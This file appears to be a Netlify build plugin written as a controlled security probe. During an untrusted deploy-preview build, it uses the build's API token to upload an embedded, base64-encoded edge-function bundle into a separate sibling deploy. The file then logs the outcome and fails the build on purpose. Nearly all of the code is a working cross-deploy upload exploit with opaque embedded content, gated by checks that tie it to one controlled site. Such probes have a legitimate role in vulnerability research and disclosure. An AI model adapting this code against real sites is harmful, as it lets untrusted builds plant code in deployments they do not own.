import { createHash } from 'node:crypto'

const EXPECTED_SITE_ID = '43a2f4e4-df31-455e-85bc-21f37fae92cd'
const EXPECTED_BRANCH = 'bot/untrusted-preview-probe-36495196637'
const EXPECTED_API_ORIGIN = 'https://api.netlify.com'
const TARGET_DEPLOY_ID = '6abdcce88db7f673491ca3a8'
const TARGET_BRANCH = 'edge-bind-v2-20261001'
const BUNDLE_SHA256 = 'beb9a4014352e6239287ee4d19e8f2baf198115325ec76c8b6a8537ff5711350'
const BUNDLE_BASE64 =
  'H4sIAAAAAAAA/+1Y34+bRhDO8/0VCFVyItnG5/P5UqRrKlXpYyL1tUoRhsHeBnbpsvhMT/7fMwvsL7B8leomSuV9sef7vp0ZYGeZZR5EUURB5CRrZpBuYZbVNBGE0Wr+Z8XoqwuMxWKxXq28U7gcq/ulyy1ul+uHe+/V4hLBXxp1JWKOqfxbP921ePr3OxnPvn7efvjsV2STE7rtVsKG0FQaSUxj3vjhORYXi3+c+nvgFfryw+VUO44SRjOyRfco4KwWgKF+N4HPO/anfhkLAVzq/sDVSrNIyqJeFi0Xy/Xix7tFtL8N3v2AcjgkeZ1CGvXzZLRPrZcdujjvwT9KJatElMTJDiKd7qfjt35S/82YBylQdrFSPznO1//qbvXgDfD1+nZ5rf+vMZ5vPM8nRcm4wGXuSROBv3OyQcunLIWwNaYd8cT4Z+CR2HGI00pLBrASxxUxEmn0xL7QMP5V4FsDvlVgLUgeiKYEE8uCLJFDa4JbONewEI2G5X8F8ziBCPZAhYnmgEqYW3xuYFLg7heUnBWkshIe4o58oFJk1RhG/lew4HLDSiFBghuFCxsxxEXwBBtbqCBXNEp6iLty3NGr2kl/RDgTBjJFcijNA2oNTcQpvhBgnNeYGUwZKZXgrxp4090prbGxXlbWtJG3UWs0oAScJVCZjJStaOBZtGPss6UwkBLhuyh4IvRuaUQGskX4LiIHV9RBlsihFcFMfKbjYqOnUfm/hwuW1rm54t7sSUKrEhLB+PhhnKCGk8ZaJdkJURpXnWVRS4da2pTDKCI7UXnZuOoym1XgoObdak9ZEROqyd5UJD0R1gGN0OY1TOItxXaDJFWU7GJKwRTEKU5N23KrqDqrpxLelIJprjcVieUpYvtaDWJJmLUYlK3oHF+Y1tajbEXvSI6N16BEXLSXbuossxz1Zk/GVUOTQRnZmJZVwEUgKzgRltBGHelAo8gIt/HoicdmaRnEliSsKBh1RT2mZHJNRuh7b12bAzpCbC+3zN6RBrAjJhRjjcUadsTDVG3QFeYEl/tQ2IGOMN6OdR3Wy37uz5GBe46UU9ryDoOWmfeyOWYTYNOOXTgc5sLepCQdSu0/nftu/5jDNk4aH30cpSO/SljXNjwfb/6nzfsFxjw4f6i7RIwXzv8Pi7XL4fn//u7h2v9/jdHu/96Hjx9+ee89ehP1JejkolDn5Nn+dnJzAwd5aPBSyOI6F167O3uv33iPP2H1/QZViZ6hPVi+buu6O1p4XoXn6iIOX4jFayo74hnD/juHOUac9vMpowmEXcoKk1N/7feb9wdI8NCehp7gNSgFZid2gO/SjzRvbOo4dbLbYdeI7WuoAc+btJ8CZninBGf5RGbOZhV2MqBzQtFhpq6nF+aQzvCVt4HJINmjFfiNvo/dg+g+leCTkOFlO4fRzn+xwByON996FV3HdVzH9zi+AGVUGv8AGAAA'
const BUNDLE = Buffer.from(BUNDLE_BASE64, 'base64')

const normalizeApiBase = (value) =>
  /^https?:\/\//i.test(value || '') ? value : `https://${value || 'api.netlify.com'}`

const readSitePolicy = async ({ apiBase, token }) => {
  try {
    const response = await fetch(new URL(`/api/v1/sites/${EXPECTED_SITE_ID}`, apiBase), {
      headers: { authorization: `Bearer ${token}` },
      redirect: 'error',
      signal: AbortSignal.timeout(10_000),
    })
    const body = response.ok ? await response.json() : null
    return {
      status: response.status,
      untrustedFlow: body?.build_settings?.untrusted_flow || null,
      publicRepo: body?.build_settings?.public_repo === true,
      responseBodyRetained: false,
    }
  } catch (error) {
    return {
      requestFailed: true,
      errorClass: error?.constructor?.name || 'Error',
      responseBodyRetained: false,
    }
  }
}

const readDeploy = async ({ apiBase, deployId, token }) => {
  try {
    const response = await fetch(new URL(`/api/v1/deploys/${deployId}`, apiBase), {
      headers: { authorization: `Bearer ${token}` },
      redirect: 'error',
      signal: AbortSignal.timeout(10_000),
    })
    const body = response.ok ? await response.json() : null
    const requiredEdgeFunctions = Array.isArray(body?.required_edge_functions)
      ? body.required_edge_functions
      : null
    return {
      status: response.status,
      ok: response.ok,
      deployIdMatches: body?.id === deployId,
      siteIdMatches: body?.site_id === EXPECTED_SITE_ID,
      context: ['deploy-preview', 'branch-deploy', 'production'].includes(body?.context)
        ? body.context
        : null,
      branch: typeof body?.branch === 'string' ? body.branch : null,
      reviewId: body?.review_id == null ? null : String(body.review_id),
      commitRef: /^[0-9a-f]{40}$/.test(body?.commit_ref || '') ? body.commit_ref : null,
      state: [
        'new',
        'enqueued',
        'building',
        'uploading',
        'uploaded',
        'preparing',
        'prepared',
        'processing',
        'processed',
        'ready',
        'error',
      ].includes(body?.state)
        ? body.state
        : null,
      published: body?.published_at != null,
      requiredEdgeFunctionListVisible: requiredEdgeFunctions !== null,
      requiredEdgeFunctionCount: requiredEdgeFunctions?.length ?? null,
      requiredEdgeFunctionMatches:
        requiredEdgeFunctions?.length === 1 && requiredEdgeFunctions[0] === BUNDLE_SHA256,
      requiredEdgeFunctionEvidenceSafe:
        requiredEdgeFunctions === null ||
        (requiredEdgeFunctions.length === 1 && requiredEdgeFunctions[0] === BUNDLE_SHA256),
      responseBodyRetained: false,
    }
  } catch (error) {
    return {
      requestFailed: true,
      errorClass: error?.constructor?.name || 'Error',
      responseBodyRetained: false,
    }
  }
}

const uploadTargetEdgeFunction = async ({ apiBase, token }) => {
  try {
    const expectedPathname = `/api/v1/deploys/${TARGET_DEPLOY_ID}/edge_functions/${BUNDLE_SHA256}`
    const url = new URL(expectedPathname, apiBase)
    if (url.pathname !== expectedPathname) {
      throw new Error('Target upload path did not round-trip')
    }
    const response = await fetch(url, {
      method: 'PUT',
      headers: {
        authorization: `Bearer ${token}`,
        'content-type': 'application/octet-stream',
      },
      body: BUNDLE,
      redirect: 'error',
      signal: AbortSignal.timeout(20_000),
    })
    await response.body?.cancel()
    return {
      status: response.status,
      ok: response.ok,
      responseBodyRead: false,
    }
  } catch (error) {
    return {
      requestFailed: true,
      errorClass: error?.constructor?.name || 'Error',
      responseBodyRead: false,
    }
  }
}

export const onPostBuild = async ({ constants, utils }) => {
  const currentDeployId = process.env.DEPLOY_ID || ''
  const currentCommitRef = process.env.COMMIT_REF || ''
  const token = constants.NETLIFY_API_TOKEN
  const apiBase = normalizeApiBase(constants.NETLIFY_API_HOST)
  let apiEndpointTrusted = false
  try {
    const parsedApiBase = new URL(apiBase)
    apiEndpointTrusted =
      parsedApiBase.origin === EXPECTED_API_ORIGIN &&
      parsedApiBase.pathname === '/' &&
      parsedApiBase.search === '' &&
      parsedApiBase.hash === '' &&
      parsedApiBase.username === '' &&
      parsedApiBase.password === ''
  } catch {}

  const tokenPresent = typeof token === 'string' && token.length > 0
  const canRead = apiEndpointTrusted && tokenPresent
  const policy = canRead ? await readSitePolicy({ apiBase, token }) : null
  const currentDeploy =
    canRead && /^[0-9a-f]{24}$/.test(currentDeployId)
      ? await readDeploy({ apiBase, deployId: currentDeployId, token })
      : null
  const targetBefore = canRead
    ? await readDeploy({ apiBase, deployId: TARGET_DEPLOY_ID, token })
    : null
  const prerequisites = {
    deployPreview: process.env.CONTEXT === 'deploy-preview',
    controlledReview: process.env.REVIEW_ID === '1',
    controlledSite: constants.SITE_ID === EXPECTED_SITE_ID,
    buildbotMode: constants.IS_LOCAL === false,
    trustedApiEndpoint: apiEndpointTrusted,
    policyReadSucceeded: policy?.status === 200,
    redactedPolicy: policy?.untrustedFlow === 'redact',
    publicRepository: policy?.publicRepo === true,
    currentDeployIdPresent: /^[0-9a-f]{24}$/.test(currentDeployId),
    currentCommitRefPresent: /^[0-9a-f]{40}$/.test(currentCommitRef),
    currentDeployBindingExact:
      currentDeploy?.status === 200 &&
      currentDeploy?.deployIdMatches === true &&
      currentDeploy?.siteIdMatches === true &&
      currentDeploy?.context === 'deploy-preview' &&
      currentDeploy?.branch === EXPECTED_BRANCH &&
      currentDeploy?.reviewId === '1' &&
      currentDeploy?.commitRef === currentCommitRef &&
      currentDeploy?.state === 'building' &&
      currentDeploy?.published === false,
    targetDeployIdExact: TARGET_DEPLOY_ID === '6abdcce88db7f673491ca3a8',
    targetDistinctFromCurrent: TARGET_DEPLOY_ID !== currentDeployId,
    targetDeployBindingExact:
      targetBefore?.status === 200 &&
      targetBefore?.deployIdMatches === true &&
      targetBefore?.siteIdMatches === true &&
      targetBefore?.context === 'deploy-preview' &&
      targetBefore?.branch === TARGET_BRANCH &&
      targetBefore?.reviewId === null &&
      targetBefore?.commitRef === null &&
      targetBefore?.state === 'uploading' &&
      targetBefore?.published === false &&
      targetBefore?.requiredEdgeFunctionEvidenceSafe === true,
    tokenPresent,
    edgeBundlePinned:
      BUNDLE.length === 1092 &&
      createHash('sha256').update(BUNDLE).digest('hex') === BUNDLE_SHA256,
  }
  const result = {
    schema: 'netlify-untrusted-same-site-cross-deploy-edge-upload.v1',
    prerequisites,
    policy,
    currentDeploy,
    targetBefore,
    attempted: false,
    upload: null,
    targetAfter: null,
    controlledFailureRequested: false,
    targetSiteOwned: true,
    targetDeployCreatedForProbe: true,
    productionTargeted: false,
    credentialValuesLogged: false,
    digestValuesLogged: false,
    responseBodiesRetained: false,
    syntheticOnly: true,
  }

  if (!Object.values(prerequisites).every(Boolean)) {
    console.log(`NETLIFY_UNTRUSTED_SIBLING_EDGE_BINDING ${JSON.stringify(result)}`)
    utils.build.failBuild('Controlled sibling Edge probe prerequisites were not satisfied')
    return
  }

  result.attempted = true
  result.upload = await uploadTargetEdgeFunction({ apiBase, token })
  await new Promise((resolveWait) => setTimeout(resolveWait, 1_000))
  result.targetAfter = await readDeploy({ apiBase, deployId: TARGET_DEPLOY_ID, token })
  result.controlledFailureRequested = true
  console.log(`NETLIFY_UNTRUSTED_SIBLING_EDGE_BINDING ${JSON.stringify(result)}`)
  utils.build.failBuild('Controlled failure after same-site sibling Edge upload probe')
}
